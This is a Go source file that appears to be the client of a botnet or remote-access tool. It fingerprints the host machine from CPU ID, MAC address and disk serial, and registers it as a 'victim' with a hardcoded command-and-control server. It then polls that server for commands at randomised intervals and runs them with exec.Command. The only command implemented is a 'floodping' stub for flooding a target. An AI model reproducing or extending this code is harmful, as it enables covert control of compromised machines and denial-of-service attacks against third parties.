package communications

import (
	"bytes"
	"encoding/json"
	"fmt"
	"mal/hash"
	"net/http"
	"math/rand"
	"time"
	"io"
	"os/exec"
	"strings"
)

/*
case "response/json"       paired with ResponseCode
case "victimregister/json" paired with VictimRegister
case "requestCommand/json" paired with IncomingVictimRequest struct
case "incomingData/json"   paired with incoming superCat data
*/

type VictimRegister struct {
	HardwareHash    string
	OperatingSystem string
}

type AssimilateResponse struct {
	ResponseString string
	ResponseCode   int
}

type VictimOutputFlow struct {
	HardwareHash 	 string //who is making this request
	GenerationSource string
	Data 		 	 string
}

type IncomingVictimRequest struct {
	HardwareHash string //who is making this request
}

type VictimCommand struct {
	Commandytype string
	Arguments    []string
}

var myHardwareHash = ""

func Register() {

	cpuID := hash.GetCPUID()
	mac := hash.GetMACAddress()
	diskSerial := hash.GetDiskSerial()

	hardwareHash := hash.GenerateHardwareHash(cpuID, mac, diskSerial)
	
	//setup global of the hash
	myHardwareHash = hardwareHash

	victimRegistry := VictimRegister{
		HardwareHash: hardwareHash,
		OperatingSystem: "EMPTY",
	}

	// Convert data to JSON
	jsonData, err := json.Marshal(victimRegistry)
	if err != nil {
		fmt.Println("Error marshalling JSON:", err)
		return
	}

	//append the front header here
	prefix := []byte("victimregister/json")
	jsonData = append(prefix, jsonData...)
	println(string(jsonData))

	// Make a POST request
	url := "http://192.168.100.145:8888/proxy"
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}
	defer resp.Body.Close()

	// Print response status for testing
	fmt.Println("Response Status:", resp.Status)
}

func Heartbeat() {
	println("entering commamnd poll mode")

	//wait till hardware hash is available
	for{
		if(myHardwareHash == ""){
			time.Sleep(time.Millisecond * 2000)
			continue
		}
		break
	}

	for{
		
		request := IncomingVictimRequest{
			HardwareHash: myHardwareHash,
		}

		//see if theres is any commands to retrieve
		jsonData, err := json.Marshal(request)
		if err != nil {
			fmt.Println("Error marshalling JSON:", err)
			continue
		}

		//append the front header here
		prefix := []byte("requestCommand/json")
		jsonData = append(prefix, jsonData...)

		// Make a POST request
		url := "http://192.168.100.145:8888/proxy"
		resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Println("Error making request:", err)
			continue
		}

		//convert the bytes to string
		bodyBytes, err := io.ReadAll(resp.Body)
    	if err != nil {
    	    fmt.Println("Error reading body:", err)
    	    continue
    	}

		//unmarshall the inputs based on what was received
		//println(string(bodyBytes))
		desig, jsonOut, _ := SeparateJsonDesignator(string(bodyBytes))
		//println(desig)
		switch desig {
		case "response/json":
			println("doing nothing here")
		case "requestCommand/json":
			parsed := VictimCommand{}
			if err := json.Unmarshal([]byte(jsonOut), &parsed); err != nil {
				fmt.Println("Error unmarshalling JSON:", err)
			}

			//handle the inputs
			go HandleCommand(parsed)
			
		}

		//close out and wait for next random heartbeat
		resp.Body.Close()
		min := 50
        max := 8000
        n := rand.Intn(max-min+1) + min
		time.Sleep(time.Duration(n) * time.Millisecond)
	}
}

func HandleCommand(incomingCommand VictimCommand){
	//println("handling incoming command")
	
	//translatedCommand := ""
	switch incomingCommand.Commandytype {
	case "floodping":
		//do interpretation based on opearting system here

		//flatten the string in the victim command here
		//flattened := strings.Join(incomingCommand.Arguments, "") // no separator
    	//fmt.Println(flattened)
	
		//translatedCommand = "ping " + incomingCommand.Arguments[0];
	}
	//print(translatedCommand)
	//print(incomingCommand.Arguments[0])
	_, err := exec.Command("ping", incomingCommand.Arguments[0]).Output()
    if err != nil {
        fmt.Println("Error:", err)
        return
    }
	//fmt.Println(string(out))

}

func SeparateJsonDesignator(incoming string) (designator string, separatedJson string, err error){

	substrings := strings.SplitN(incoming, "{", 2)
	
	if len(substrings) < 2 {
		return "", "", fmt.Errorf("invalid format, missing `{`")
	}

	designator = strings.TrimSpace(substrings[0])
	separatedJson = "{" + substrings[1] // add the `{` back

	return designator, separatedJson, nil
}
